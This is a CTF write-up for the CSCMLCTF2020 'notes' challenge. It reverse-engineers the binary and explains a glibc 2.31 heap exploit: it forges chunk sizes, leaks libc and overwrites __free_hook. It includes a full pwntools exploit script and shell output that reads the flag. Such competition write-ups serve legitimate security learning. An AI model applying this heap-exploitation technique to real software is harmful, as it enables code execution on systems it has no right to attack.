---
layout: page
title: "[writeup] CSCMLCTF2020 / notes"
date: 2020-07-06 00:00:00 -0000
---

There're 2 solves and I got first. :p  

This task is typical note task with glibc2.31.

#### Reverse part
- I dont know why, but we just can't fully decompile this binary. So we have to analyze this from dissasembled one.
- By reading and playing with the code, I found that "write note" function always use fixed size(0x20).
    - line 101624, 101641: These lines show that here is "create note" part.
    - line 101689 ~ 1016a0: calloc("scanf output", 1)
    - line 1016fe ~ 10170a: fgets("titile buffer", 0x20)
    - line 10171d: strcspn("title buffer", "0xa")

```
                             LAB_00101624                                    XREF[1]:     00101601(j)  
        00101624 48 8d 3d        LEA        RDI,[s_ohhh,_Please_create_new_note_..._001021   = "ohhh, Please create new note 
                 2d 0b 00 00
        0010162b e8 00 fb        CALL       puts                                             int puts(char * __s)
                 ff ff
        00101630 48 8d 3d        LEA        RDI,[s_*******************************_00102078] = "*****************************
                 41 0a 00 00
        00101637 e8 f4 fa        CALL       puts                                             int puts(char * __s)
                 ff ff
        0010163c e9 ba 01        JMP        LAB_001017fb
                 00 00
                             LAB_00101641                                    XREF[1]:     00101622(j)  
        00101641 48 8d 3d        LEA        RDI,[s_Title_Length:_00102179]                   = "Title Length:   "
                 31 0b 00 00
        00101648 b8 00 00        MOV        EAX,0x0
                 00 00
        0010164d e8 fe fa        CALL       printf                                           int printf(char * __format, ...)
                 ff ff
        00101652 48 8d 45 dc     LEA        RAX,[RBP + -0x24]
        00101656 48 89 c6        MOV        RSI,RAX
        00101659 48 8d 3d        LEA        RDI,[DAT_00102074]                               = 25h    %
                 14 0a 00 00
        00101660 b8 00 00        MOV        EAX,0x0
                 00 00
        00101665 e8 46 fb        CALL       __isoc99_scanf                                   undefined __isoc99_scanf()
                 ff ff
        0010166a 48 8d 3d        LEA        RDI,[s_Content_Length:_0010218a]                 = "Content Length:   "
                 19 0b 00 00
        00101671 b8 00 00        MOV        EAX,0x0
                 00 00
        00101676 e8 d5 fa        CALL       printf                                           int printf(char * __format, ...)
                 ff ff
        0010167b 48 8d 45 e0     LEA        RAX,[RBP + -0x20]
        0010167f 48 89 c6        MOV        RSI,RAX
        00101682 48 8d 3d        LEA        RDI,[DAT_00102074]                               = 25h    %
                 eb 09 00 00
        00101689 b8 00 00        MOV        EAX,0x0
                 00 00
        0010168e e8 1d fb        CALL       __isoc99_scanf                                   undefined __isoc99_scanf()
                 ff ff
        00101693 8b 45 e0        MOV        EAX,dword ptr [RBP + -0x20]
        00101696 89 c0           MOV        EAX,EAX
        00101698 be 01 00        MOV        ESI,0x1
                 00 00
        0010169d 48 89 c7        MOV        RDI,RAX
        001016a0 e8 db fa        CALL       calloc                                           void * calloc(size_t __nmemb, si
                 ff ff
        001016a5 48 89 45 f0     MOV        qword ptr [RBP + -0x10],RAX
        001016a9 48 83 7d        CMP        qword ptr [RBP + -0x10],0x0
                 f0 00
        001016ae 75 0a           JNZ        LAB_001016ba
        001016b0 b8 00 00        MOV        EAX,0x0
                 00 00
        001016b5 e8 0e fe        CALL       r_error                                          undefined r_error()
                 ff ff
                             LAB_001016ba                                    XREF[1]:     001016ae(j)  
        001016ba 8b 45 dc        MOV        EAX,dword ptr [RBP + -0x24]
        001016bd 89 c0           MOV        EAX,EAX
        001016bf be 01 00        MOV        ESI,0x1
                 00 00
        001016c4 48 89 c7        MOV        RDI,RAX
        001016c7 e8 b4 fa        CALL       calloc                                           void * calloc(size_t __nmemb, si
                 ff ff
        001016cc 48 89 45 e8     MOV        qword ptr [RBP + -0x18],RAX
        001016d0 48 83 7d        CMP        qword ptr [RBP + -0x18],0x0
                 e8 00
        001016d5 75 0a           JNZ        LAB_001016e1
        001016d7 b8 00 00        MOV        EAX,0x0
                 00 00
        001016dc e8 e7 fd        CALL       r_error                                          undefined r_error()
                 ff ff
                             LAB_001016e1                                    XREF[1]:     001016d5(j)  
        001016e1 e8 aa fa        CALL       getchar                                          int getchar(void)
                 ff ff
        001016e6 48 8d 3d        LEA        RDI,[s_Title:_0010219d]                          = "Title:  "
                 b0 0a 00 00
        001016ed b8 00 00        MOV        EAX,0x0
                 00 00
        001016f2 e8 59 fa        CALL       printf                                           int printf(char * __format, ...)
                 ff ff
        001016f7 48 8b 15        MOV        RDX,qword ptr [stdin]
                 32 29 00 00
        001016fe 48 8b 45 e8     MOV        RAX,qword ptr [RBP + -0x18]
        00101702 be 20 00        MOV        ESI,0x20
                 00 00
        00101707 48 89 c7        MOV        RDI,RAX
        0010170a e8 61 fa        CALL       fgets                                            char * fgets(char * __s, int __n
                 ff ff
        0010170f 48 8b 45 e8     MOV        RAX,qword ptr [RBP + -0x18]
        00101713 48 8d 35        LEA        RSI,[DAT_001021a6]                               = 0Ah
                 8c 0a 00 00
        0010171a 48 89 c7        MOV        RDI,RAX
        0010171d e8 3e fa        CALL       strcspn                                          size_t strcspn(char * __s, char 
                 ff ff
```
- Data structure: 

| name | size (byte) | 
| -- | -- |
| title addr | 8 |
| title length | 8 |
| content addr | 8 |
| content length | 8 |

- Plan is simple. Modify heap header and overlap note chunks and overwrite it. One point to care is that we have to fill the Tcache  because this binary uses calloc instead of malloc.

#### Pwn part
1. Leak  
This binary using tcache in glibc2.31, I planed to get libc address by freeing large chunk. (> 0x410)   
Just forging size header to "0x611" using "write note #0 title".  

![leak](/assets/notes/about_leak.png)

2. Overwrite
When overlap chunk has been created, we can now create fake chunk to edit one of existing chunk. I choose note #30 to edit.  
Then I edit `__free_hook` through "edit note #30".  

![overwrite](/assets/notes/about_overwrite_fp.png)

Final exploit is here. 
```python
from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './notes'
HOST = 'ctf.cscml.zenysec.com'
PORT = 20006

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

def create():
    r.sendlineafter('>>>', '1')

def write(idx, tlen, clen, t, c):
    r.sendlineafter('>>>', '2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(tlen))
    r.sendlineafter(': ', str(clen))
    r.sendlineafter(': ', str(t))
    r.sendlineafter(': ', str(c))

def edit(idx, t, c):
    r.sendlineafter('>>>', '3')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(t))
    r.sendlineafter(': ', str(c))

def show(idx):
    r.sendlineafter('>>>', '4')
    r.sendlineafter(':     ', str(idx))

def delete(idx):
    r.sendlineafter('>>>', '5')
    r.sendlineafter(': ', str(idx))


for i in range(30):
    create()

for i in range(20):
    write(i, 0x18, 0x18, (p64(0x21)*3)[:-1], (p64(0x21)*3)[:-1])

create()
for i in range(20, 30):
    write(i, 0x68, 0x18, (p64(0x21)*3)[:-1], (p64(0x21)*3)[:-1])
for i in range(10, 17):
    delete(i)
for i in range(20, 27):
    delete(i)

delete(0)
create()
write(0, 0x18, 0x18, 'A'*0x18+'\x11\x06', 'XXXX'*0x1)

delete(1)
create()
write(1, 0x28, 0x58, 'DDDD', flat(0,0,0))
show(2)

leak = u64(r.recv(8))
dbg('leak')
base = leak - 0x1ebbe0
dbg('base')
system = base + 0x55410
mh = base + 0x1ebb70
fh = base + 0x1eeb28

for i in range(5):
    create()
write(30, 0x208, 0x238-0x80, 'AA', 'AA')

write(13, 0x38, 0x48, 'BB', 'BB')
write(14, 0x48, 0x28, flat(fh-0x10, 0x100, fh), 'A')
if args.D:
    debug(r, [0x1cd6, 0x1aa8, 0x1aed])

edit(30, '/bin/sh', p64(system))
delete(30)

r.interactive()
```


```
[+] Opening connection to ctf.cscml.zenysec.com on port 20006: Done
    -> leak: 0x7f8ed7665be0
    -> base: 0x7f8ed747a000
[*] Paused (press any to continue)
[*] Switching to interactive mode
    $ 
$ ls
chall
flag.txt
$ cat f*
CSCML2020{I_have_not_failed_Ive_just_found_10000_ways_that_wont_work}
```
![fb](/assets/notes/fb.png)
